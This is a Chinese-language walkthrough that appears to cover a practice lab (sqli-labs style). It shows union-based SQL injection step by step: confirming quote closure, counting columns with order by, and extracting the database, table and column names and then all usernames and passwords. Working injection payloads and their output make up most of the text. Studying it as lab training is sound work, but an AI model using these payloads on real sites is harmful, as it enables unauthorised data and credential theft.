# 确认闭合类型
输入: ?id=1'--+  
成功回显，说明是单引号闭合


看报错：near ''1'' LIMIT 0,1' at line 1  
       '1'' LIMIT 0,1  
说明我们输入后再服务器构造成了 ='1'' LIMIT 0,1  
这时候我们在输入时添加注释符可以不让后面的字符生效  
='1'--+' LIMIT 0,1  等价于只有  ='1'  

# 确认回显位置
首先我们需要知道服务器执行数据库查询语句时查询了几个数据  
这时候我们可以order by [number]来进行测试，一般可以采用二分法  

当我们输入?id=1' order by 4--+时，服务器报错了  
当我们输入?id=1' order by 3--+时，服务器仍然正常  
所以我们可以确定查询语句中select后面只有三个值  

之后我们输入一个错误数据，让数据库无法查询到正确数据  
并使用联合查询，直接让数据库回复1,2,3，查看回显位置  
?id=-1' union select 1,2,3 --+  
可以看到  
Your Login name:2  
Your Password:3  

所以我们可以利用联合注入select的2和3的位置

# 查询数据库名
我们先试着查询数据库名字，利用的是2这个位置  
?id=-1' union select 1,database(),3 --+  
这样会在Your Login name处显示数据库名称  
回显：Your Login name:security

到这里我们获得了服务器数据库名称security  
之后我们可以直接使用security代替数据库名称，当然也可以继续使用database()

# 查询表名
得到了数据库后（当然可以跳过这一步）  
我们可以进步利用sql注入漏洞了  
接下来我们获取数据库中所有表的名称  
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+  
回显：Your Login name:emails,referers,uagents,users

我们获得了四个表的名称，我们可以一一对所有表进行查询  
当然一般会根据表的名称来进行，这里利用的是users

# 查询列名
我们获得了表后，接下来该获取表中所有的列  
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database()--+  
我们利用information_schema.columns中包含table_name可以对我们需要的表进行过滤  
回显Your Login name:id,username,password  
这样我们就获得了users表中所有列名

# 查询值
根据直觉来说，我们需要用户名和密码，所以我们可以通过查询其中的username和password来获得所有用户名和密码

我们现在可以利用2和3的位置来分别查询username和password  
而且我们获取表名后，就可以直接查表了  
?id=-1' union select 1,group_concat(username),group_concat(password) from users--+

回显：  
Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4  
Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4

到此就结束了


# 源码
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";  
就是最简单的sql查询语句，对输入没有任何过滤，单引号闭合后，在后面加上注释符，就构造成了我们想要的查询语句
